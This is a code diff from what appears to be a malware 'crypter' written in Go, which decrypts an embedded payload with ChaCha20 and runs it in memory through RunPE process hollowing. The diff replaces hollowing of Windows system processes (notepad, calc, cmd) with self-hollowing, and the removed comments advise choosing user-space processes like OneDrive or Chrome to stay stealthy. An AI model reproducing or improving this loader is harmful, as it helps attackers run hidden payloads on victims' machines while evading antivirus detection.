@@ -3,8 +3,6 @@ package main
 import (
 	_ "embed"
 	"log"
-	"os"
-	"path/filepath"
 
 	"golang.org/x/crypto/chacha20"
 	"crypter/internal/runpe"
@@ -40,26 +38,15 @@ func decryptFile() ([]byte, error) {
 }
 
 func fileless(execBytes []byte) {
-	// Try multiple potential target processes in case one fails, these can be configured to your liking
-	// Preferably, local user space accessible processes (avoid System32 processes if you really want to be stealthy, like OneDrive or Chrome)
-	// Note: This is a simplified example. In a real-world scenario, you would want to check if the target process is running and if it has the necessary permissions.
+	// With self-hollowing, we no longer need a target process path
+	// as the current process will be hollowed out and replaced
+	log.Println("Starting self-hollowing process...")
 	
-	targetPaths := []string{
-		filepath.Join(os.Getenv("WINDIR"), "System32", "notepad.exe"),
-		filepath.Join(os.Getenv("WINDIR"), "System32", "calc.exe"),
-		filepath.Join(os.Getenv("WINDIR"), "System32", "cmd.exe"),
+	err := runpe.ExecuteInMemory(execBytes, "")
+	if err != nil {
+		log.Fatalf("Self-hollowing execution failed: %v", err)
 	}
 	
-	var lastErr error
-	for _, targetPath := range targetPaths {
-		err := runpe.ExecuteInMemory(execBytes, targetPath)
-		if err == nil {
-			log.Println("RunPE memory execution completed successfully using", targetPath)
-			return
-		}
-		lastErr = err
-		log.Printf("Failed to execute using %s: %v, trying next target...", targetPath, err)
-	}
-	
-	log.Fatalf("All RunPE execution attempts failed. Last error: %v", lastErr)
+	// If we reach here, something went wrong as the process should have been replaced
+	log.Println("Warning: Process continued execution after self-hollowing, this indicates a potential issue")
 } 
